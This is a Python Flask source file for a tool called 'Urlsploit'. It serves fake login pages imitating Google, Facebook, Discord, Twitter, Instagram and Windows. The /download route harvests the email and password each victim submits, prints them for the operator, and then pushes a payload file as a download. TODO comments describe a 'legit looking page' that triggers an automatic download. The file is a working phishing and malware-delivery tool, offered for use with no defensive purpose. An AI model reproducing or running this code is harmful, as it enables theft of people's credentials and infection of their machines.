from flask import Flask, render_template, request, send_file
import flask
import _thread
from colorama import Fore, Style
import colorama
import time, os, sys

# TODO: 
# User opens link
# Automatic download starts
# Legit looking page.

colorama.init()
# TODO-STARTUP : 
# Animated intro (5 secs) 
tag_ok = "["+Style.BRIGHT+Fore.GREEN +"+"+Style.RESET_ALL+"]"
tag_notok = "["+Style.BRIGHT+Fore.RED +"-"+Style.RESET_ALL+"]"
tag_hm = "["+Style.BRIGHT+Fore.LIGHTCYAN_EX +"^"+Style.RESET_ALL+"]"

templates = [
            "google",
             "facebook",
             "discordapp",
             "twitter",
             "instagram",
             "windows"
            ]

def checkTemplate(template_name):
    if(template_name in templates):
        return True
    else:
        return False

def clear():
    if(os.name == "nt"): 
        os.system("cls")
    else:
        os.system("clear")

def AnimateIntro():
    
    banner = [
        "\n                                                                          \n"
        "  ██╗   ██╗██████╗ ██╗         ███████╗██████╗ ██╗      ██████╗ ██╗████████╗\n"
        "  ██║   ██║██╔══██╗██║         ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n"
        "  ██║   ██║██████╔╝██║         ███████╗██████╔╝██║     ██║   ██║██║   ██║   \n"
        "  ██║   ██║██╔══██╗██║         ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   \n"
        "  ╚██████╔╝██║  ██║███████╗    ███████║██║     ███████╗╚██████╔╝██║   ██║   \n"
        "   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   \n"
        "                          Version 1 by QuantumCore                          \n"                               
    
    ]
    clear()
    for b in banner:          
        for c in b:          
            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + c + Style.RESET_ALL, end='')    
            sys.stdout.flush()  
            time.sleep(0.001)          
    print('')  


def WebServer(mode, payload):
    app = Flask("Urlsploit", template_folder="templates")
    app.static_folder = 'static'
    global index_file
    if(mode == "google"):
        index_file = "google.html"
    elif(mode == "facebook"):
        index_file = "facebook.html"
    elif(mode == "discordapp"):
        index_file = "discord.html"
    elif(mode == "twitter"):
        index_file = "twitter.html"
    elif(mode == "instagram"):
        index_file = "instagram.html"
    elif(mode == "windows"):
        index_file = "windows.html"
    else:
        print(tag_notok + " Error : Mode not found.")

    @app.route("/")
    def main():
        return render_template(index_file)
        

    @app.route("/download", methods=["POST"])
    def download():
        if(request.method == "POST"):
            winEmail = request.form.get('email')
            winPass = request.form.get('password')
            print(tag_ok + " POST : {e}".format(e=winEmail))
            print(tag_ok + " POST : {p}".format(p=winPass))
            return send_file(payload, as_attachment=True)
        


    app.run(host="127.0.0.1", port=80)
